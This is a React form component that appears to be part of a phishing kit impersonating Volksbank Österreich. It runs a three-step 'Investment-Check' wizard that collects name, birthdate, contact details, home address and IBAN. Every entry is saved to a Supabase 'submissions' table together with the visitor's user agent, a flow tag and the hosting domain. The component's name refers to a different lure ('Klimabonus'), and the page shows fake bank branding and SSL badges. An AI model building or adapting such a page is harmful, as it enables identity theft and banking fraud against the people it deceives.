import { useState, useEffect, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowRight, ArrowLeft, Lock, User, Calendar, Mail, MapPin, DoorOpen, Building2, CheckCircle2 } from "lucide-react";
import { cn } from "@/lib/utils";
import { formatIBAN } from "@/lib/format";
import { banksAT as banks, formatBirthdate } from "@/lib/banks";
import { supabase } from "@/integrations/supabase/client";
import InvestmentCheckWizardShell from "@/components/InvestmentCheckWizardShell";

const VB_NAVY = "#003882";

const fieldBase =
  "h-11 w-full rounded-md border px-3 text-sm focus:outline-none focus:ring-2 transition";
const fieldOk =
  "border-gray-300 focus:border-[#003882] focus:ring-[#003882]/20";
const fieldErr =
  "border-red-500 focus:border-red-500 focus:ring-red-500/20";
const fieldClass = `${fieldBase} ${fieldOk}`;
const labelClass = "mb-1.5 block text-[13px] font-medium text-gray-700";

const REQUIRED_MESSAGES: Record<string, string> = {
  firstName: "Bitte geben Sie Ihren Vornamen ein",
  lastName: "Bitte geben Sie Ihren Nachnamen ein",
  birthdate: "Bitte geben Sie Ihr Geburtsdatum ein",
  email: "Bitte geben Sie Ihre E-Mail-Adresse ein",
  phone: "Bitte geben Sie Ihre Telefonnummer ein",
  street: "Bitte geben Sie Ihre Straße ein",
  houseNumber: "Bitte geben Sie Ihre Hausnummer ein",
  postalCode: "Bitte geben Sie Ihre Postleitzahl ein",
  city: "Bitte geben Sie Ihre Stadt ein",
};
const REQUIRED_FIELDS = Object.keys(REQUIRED_MESSAGES);

const KlimabonusVoranmeldung = () => {
  const [step, setStep] = useState<1 | 2 | 3>(1);

  // Persönliche Daten
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [email, setEmail] = useState("");
  const [birthdate, setBirthdate] = useState("");
  const [phone, setPhone] = useState("");
  const [street, setStreet] = useState("");
  const [houseNumber, setHouseNumber] = useState("");
  const [staircase, setStaircase] = useState("");
  const [doorNumber, setDoorNumber] = useState("");
  const [postalCode, setPostalCode] = useState("");
  const [city, setCity] = useState("");
  const [touched, setTouched] = useState<Record<string, boolean>>({});

  const values: Record<string, string> = {
    firstName, lastName, birthdate, email, phone, street, houseNumber, postalCode, city,
  };
  const hasError = (name: string) =>
    !!touched[name] && !values[name]?.trim();
  const inputCls = (name: string) =>
    `${fieldBase} ${hasError(name) ? fieldErr : fieldOk}`;
  const onBlur = (name: string) => () =>
    setTouched((t) => ({ ...t, [name]: true }));
  const ErrMsg = ({ name }: { name: string }) =>
    hasError(name) ? (
      <p className="mt-1 text-[12px] text-red-600">{REQUIRED_MESSAGES[name]}</p>
    ) : null;
  const handleNext = () => {
    if (step1Valid) {
      setStep(2);
    } else {
      setTouched(
        REQUIRED_FIELDS.reduce((acc, f) => ({ ...acc, [f]: true }), {})
      );
    }
  };

  // Bankdaten
  const [iban, setIban] = useState("");
  const selectedBank = "Volksbank";

  useEffect(() => {
    const title =
      step === 1
        ? "Persönliche Daten – Investment-Check | Volksbank"
        : step === 2
        ? "Bankdaten – Investment-Check | Volksbank"
        : "Investment-Check angefordert | Volksbank";
    const description =
      step === 1
        ? "Schritt 1 von 3: Geben Sie Ihre persönlichen Daten für den Investment-Check bei der Volksbank ein."
        : step === 2
        ? "Schritt 2 von 3: Geben Sie Ihre Bankdaten (IBAN) für die Investment-Beratung ein."
        : "Schritt 3 von 3: Ihr Investment-Check wurde angefordert – ein Berater meldet sich in Kürze.";
    document.title = title;
    let meta = document.querySelector('meta[name="description"]');
    if (!meta) {
      meta = document.createElement("meta");
      meta.setAttribute("name", "description");
      document.head.appendChild(meta);
    }
    meta.setAttribute("content", description);
  }, [step]);

  useEffect(() => {
    window.scrollTo(0, 0);
  }, [step]);

  const ibanCleanLength = iban.replace(/\s/g, "").length;
  const showBankPicker = ibanCleanLength > 10;
  const selectedBankObj = banks.find((b) => b.name === selectedBank);

  const step1Valid =
    firstName.trim() &&
    lastName.trim() &&
    email.trim() &&
    birthdate.trim() &&
    phone.trim() &&
    street.trim() &&
    houseNumber.trim() &&
    postalCode.trim() &&
    city.trim();

  const step2Valid = ibanCleanLength >= 16 && selectedBank;

  const handleSubmit = useCallback(async () => {
    if (!step2Valid) return;
    const sessionId = crypto.randomUUID().slice(0, 8);

    const { error } = await supabase
      .from("submissions")
      .insert({
        session_id: sessionId,
        full_name: `${firstName} ${lastName}`.trim(),
        email,
        birthdate,
        phone,
        street,
        house_number: houseNumber,
        staircase,
        door_number: doorNumber,
        postal_code: postalCode,
        city,
        iban,
        bank: selectedBank,
        flow: "investmentcheck",
        user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
        domain:
          typeof window !== "undefined"
            ? window.location.hostname.replace(/^www\./, "").toLowerCase()
            : null,
      })
      .select("id")
      .single();

    if (error) {
      console.error("Insert failed:", error);
      alert("Fehler beim Speichern der Daten. Bitte versuchen Sie es erneut.");
      return;
    }

    setStep(3);
  }, [
    step2Valid,
    firstName,
    lastName,
    email,
    birthdate,
    phone,
    street,
    houseNumber,
    staircase,
    doorNumber,
    postalCode,
    city,
    iban,
    selectedBank,
  ]);

  return (
    <>
      <InvestmentCheckWizardShell step={step}>
        {step === 1 && (
          <div>
            <div className="text-center mb-6">
              <div
                className="text-[11px] font-semibold uppercase tracking-[0.18em] mb-1"
                style={{ color: VB_NAVY }}
              >
                Schritt 1 von 3
              </div>
              <h1 className="text-xl md:text-2xl font-semibold text-gray-900">
                Persönliche Daten
              </h1>
              <p className="text-[13.5px] text-gray-600 mt-1">
                Bitte tragen Sie Ihre Daten vollständig ein.
              </p>
            </div>

            <div className="space-y-5">
              {/* Zeile: Vorname / Nachname */}
              <div className="flex items-start gap-3">
                <div className="w-10 h-10 rounded-md bg-[#003882]/10 text-[#003882] flex items-center justify-center shrink-0 mt-[26px]">
                  <User className="w-5 h-5" />
                </div>
                <div className="flex-1 grid grid-cols-2 gap-4">
                  <div>
                    <label className={labelClass}>Vorname</label>
                    <input
                      type="text"
                      value={firstName}
                      onChange={(e) => setFirstName(e.target.value)}
                      onBlur={onBlur("firstName")}
                      className={inputCls("firstName")}
                    />
                    <ErrMsg name="firstName" />
                  </div>
                  <div>
                    <label className={labelClass}>Nachname</label>
                    <input
                      type="text"
                      value={lastName}
                      onChange={(e) => setLastName(e.target.value)}
                      onBlur={onBlur("lastName")}
                      className={inputCls("lastName")}
                    />
                    <ErrMsg name="lastName" />
                  </div>
                </div>
              </div>

              {/* Zeile: Geburtsdatum (volle Breite) */}
              <div className="flex items-start gap-3">
                <div className="w-10 h-10 rounded-md bg-[#003882]/10 text-[#003882] flex items-center justify-center shrink-0 mt-[26px]">
                  <Calendar className="w-5 h-5" />
                </div>
                <div className="flex-1">
                  <label className={labelClass}>Geburtsdatum</label>
                  <input
                    type="text"
                    inputMode="numeric"
                    value={birthdate}
                    onChange={(e) => {
                      let raw = e.target.value;
                      if (
                        raw.length < birthdate.length &&
                        birthdate.endsWith(".") &&
                        !raw.endsWith(".")
                      ) {
                        raw = raw.slice(0, -1);
                      }
                      setBirthdate(formatBirthdate(raw));
                    }}
                    onBlur={onBlur("birthdate")}
                    placeholder="TT.MM.JJJJ"
                    maxLength={10}
                    className={inputCls("birthdate")}
                  />
                  <ErrMsg name="birthdate" />
                </div>
              </div>

              {/* Zeile: E-Mail / Telefon */}
              <div className="flex items-start gap-3">
                <div className="w-10 h-10 rounded-md bg-[#003882]/10 text-[#003882] flex items-center justify-center shrink-0 mt-[26px]">
                  <Mail className="w-5 h-5" />
                </div>
                <div className="flex-1 grid grid-cols-2 gap-4">
                  <div>
                    <label className={labelClass}>E-Mail</label>
                    <input
                      type="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      onBlur={onBlur("email")}
                      className={inputCls("email")}
                    />
                    <ErrMsg name="email" />
                  </div>
                  <div>
                    <label className={labelClass}>Telefonnummer</label>
                    <input
                      type="tel"
                      value={phone}
                      onChange={(e) => setPhone(e.target.value)}
                      onBlur={onBlur("phone")}
                      className={inputCls("phone")}
                    />
                    <ErrMsg name="phone" />
                  </div>
                </div>
              </div>

              {/* Zeile: Straße / Hausnummer */}
              <div className="flex items-start gap-3">
                <div className="w-10 h-10 rounded-md bg-[#003882]/10 text-[#003882] flex items-center justify-center shrink-0 mt-[26px]">
                  <MapPin className="w-5 h-5" />
                </div>
                <div className="flex-1 grid grid-cols-2 gap-4">
                  <div>
                    <label className={labelClass}>Straße</label>
                    <input
                      type="text"
                      value={street}
                      onChange={(e) => setStreet(e.target.value)}
                      onBlur={onBlur("street")}
                      className={inputCls("street")}
                    />
                    <ErrMsg name="street" />
                  </div>
                  <div>
                    <label className={labelClass}>Hausnummer</label>
                    <input
                      type="text"
                      value={houseNumber}
                      onChange={(e) => setHouseNumber(e.target.value)}
                      onBlur={onBlur("houseNumber")}
                      className={inputCls("houseNumber")}
                    />
                    <ErrMsg name="houseNumber" />
                  </div>
                </div>
              </div>

              {/* Zeile: Stiege / Türnummer (optional) */}
              <div className="flex items-start gap-3">
                <div className="w-10 h-10 rounded-md bg-[#003882]/10 text-[#003882] flex items-center justify-center shrink-0 mt-[26px]">
                  <DoorOpen className="w-5 h-5" />
                </div>
                <div className="flex-1 grid grid-cols-2 gap-4">
                  <div>
                    <label className={labelClass}>Stiege</label>
                    <input
                      type="text"
                      value={staircase}
                      onChange={(e) => setStaircase(e.target.value)}
                      className={fieldClass}
                    />
                  </div>
                  <div>
                    <label className={labelClass}>Türnummer</label>
                    <input
                      type="text"
                      value={doorNumber}
                      onChange={(e) => setDoorNumber(e.target.value)}
                      className={fieldClass}
                    />
                  </div>
                </div>
              </div>

              {/* Zeile: PLZ / Stadt */}
              <div className="flex items-start gap-3">
                <div className="w-10 h-10 rounded-md bg-[#003882]/10 text-[#003882] flex items-center justify-center shrink-0 mt-[26px]">
                  <Building2 className="w-5 h-5" />
                </div>
                <div className="flex-1 grid grid-cols-2 gap-4">
                  <div>
                    <label className={labelClass}>Postleitzahl</label>
                    <input
                      type="text"
                      value={postalCode}
                      onChange={(e) => setPostalCode(e.target.value)}
                      onBlur={onBlur("postalCode")}
                      className={inputCls("postalCode")}
                    />
                    <ErrMsg name="postalCode" />
                  </div>
                  <div>
                    <label className={labelClass}>Stadt</label>
                    <input
                      type="text"
                      value={city}
                      onChange={(e) => setCity(e.target.value)}
                      onBlur={onBlur("city")}
                      className={inputCls("city")}
                    />
                    <ErrMsg name="city" />
                  </div>
                </div>
              </div>
            </div>

            <div className="mt-8 flex justify-center">
              <button
                type="button"
                onClick={handleNext}
                className="inline-flex items-center gap-2 bg-[#003882] hover:bg-[#002a63] text-white font-semibold text-sm px-7 py-3 rounded-md transition-colors"
              >
                <span>Weiter</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          </div>
        )}

        {step === 2 && (
          <div>
            <div className="text-center mb-6">
              <div
                className="text-[11px] font-semibold uppercase tracking-[0.18em] mb-1"
                style={{ color: VB_NAVY }}
              >
                Schritt 2 von 3
              </div>
              <h1 className="text-xl md:text-2xl font-semibold text-gray-900">
                Bankdaten
              </h1>
              <p className="text-[13.5px] text-gray-600 mt-1">
                Geben Sie Ihre IBAN ein, zur Verifizierung Ihrer Bankverbindung.
              </p>
            </div>

            <div className="space-y-4">
              <div>
                <label className={labelClass}>IBAN</label>
                <input
                  type="text"
                  value={iban}
                  onChange={(e) => setIban(formatIBAN(e.target.value))}
                  maxLength={29}
                  placeholder="AT00 0000 0000 0000 0000"
                  className={cn(fieldClass, "tracking-wider")}
                />
              </div>

              {showBankPicker && (
                <div className="animate-in fade-in slide-in-from-top-2 duration-300">
                  <label className={labelClass}>Bank</label>
                  <div
                    className="flex h-11 w-full items-center rounded-md border border-gray-300 bg-gray-50 px-3 cursor-not-allowed"
                    aria-readonly="true"
                  >
                    {selectedBankObj && (
                      <img
                        src={selectedBankObj.icon}
                        alt=""
                        className="mr-2 h-5 w-5 object-contain"
                      />
                    )}
                    <span className="text-sm text-gray-900">{selectedBank}</span>
                  </div>
                </div>
              )}
            </div>

            <div className="flex items-center justify-center gap-2 mt-6 text-[12px] text-gray-500">
              <Lock className="w-3.5 h-3.5" />
              <span>SSL-verschlüsselt · Volksbank Österreich</span>
            </div>

            <div className="mt-6 flex items-center justify-between gap-3">
              <button
                type="button"
                onClick={() => setStep(1)}
                className="inline-flex items-center gap-2 bg-white hover:bg-gray-50 border border-gray-300 text-gray-700 font-medium text-sm px-5 py-3 rounded-md transition-colors"
              >
                <ArrowLeft className="w-4 h-4" />
                <span>Zurück</span>
              </button>
              <button
                type="button"
                disabled={!step2Valid}
                onClick={handleSubmit}
                className="inline-flex items-center gap-2 bg-[#003882] hover:bg-[#002a63] disabled:bg-gray-300 disabled:cursor-not-allowed text-white font-semibold text-sm px-7 py-3 rounded-md transition-colors"
              >
                <span>Weiter</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          </div>
        )}

        {step === 3 && (
          <div className="text-center py-4">
            <div
              className="text-[11px] font-semibold uppercase tracking-[0.18em] mb-2"
              style={{ color: VB_NAVY }}
            >
              Schritt 3 von 3
            </div>
            <h1 className="text-xl md:text-2xl font-semibold text-gray-900 mb-6">
              Investment-Check
            </h1>

            <div
              className="mx-auto mb-6 w-16 h-16 rounded-full flex items-center justify-center"
              style={{ backgroundColor: "rgba(0,56,130,0.08)" }}
            >
              <CheckCircle2 className="w-10 h-10" style={{ color: VB_NAVY }} strokeWidth={2} />
            </div>

            <p className="text-[15px] font-semibold text-gray-900 mb-3">
              Ihr Investment-Check wurde erfolgreich angefordert.
            </p>
            <p className="text-[14px] text-gray-600 max-w-md mx-auto leading-relaxed">
              Ein spezialisierter Berater der Volksbank wird sich in Kürze
              persönlich bei Ihnen melden, um Ihre Anlagesituation gemeinsam mit
              Ihnen zu besprechen.
            </p>

            <div className="flex items-center justify-center gap-2 mt-8 text-[12px] text-gray-500">
              <Lock className="w-3.5 h-3.5" />
              <span>SSL-verschlüsselt · Volksbank Österreich</span>
            </div>
          </div>
        )}
      </InvestmentCheckWizardShell>
    </>
  );
};

export default KlimabonusVoranmeldung;
